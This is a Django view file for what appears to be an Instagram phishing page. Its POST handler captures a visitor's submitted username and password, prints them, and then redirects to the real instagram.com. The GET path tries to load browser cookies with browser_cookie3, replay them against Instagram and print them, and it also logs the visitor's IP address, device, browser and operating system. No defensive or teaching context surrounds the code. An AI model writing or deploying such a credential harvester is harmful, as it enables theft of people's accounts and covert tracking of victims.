from django.shortcuts import render
from django.http import HttpResponseRedirect
from django.conf import settings
import browser_cookie3
import requests

def index_page(request):
    data = {}
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        print('username :'+username+'\npassword:'+password)
        return HttpResponseRedirect('https://instagram.com')

    cj = browser_cookie3.load()
    r = requests.get('https://www.instagram.com', cookies=cj)
    if r.cookies:
        print(r.cookies)
    else:
        print('no cookie found for the specific domain, please try again later...')


    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    device_type = ""
    browser_type = ""
    browser_version = ""
    os_type = ""
    os_version = ""
    if request.user_agent.is_mobile:
        device_type = "Mobile"
    if request.user_agent.is_tablet:
        device_type = "Tablet"
    if request.user_agent.is_pc:
        device_type = "PC"
    browser_type = request.user_agent.browser.family
    browser_version = request.user_agent.browser.version_string
    os_type = request.user_agent.os.family
    os_version = request.user_agent.os.version_string
    sign_in_data = "ip :"+ip+"\n browser type: "+browser_type+"\n browser version: "+browser_version+"\n os type: "+os_type+"\n os_version: "+os_version
    print(sign_in_data)

    return render(request, 'index.html', data)
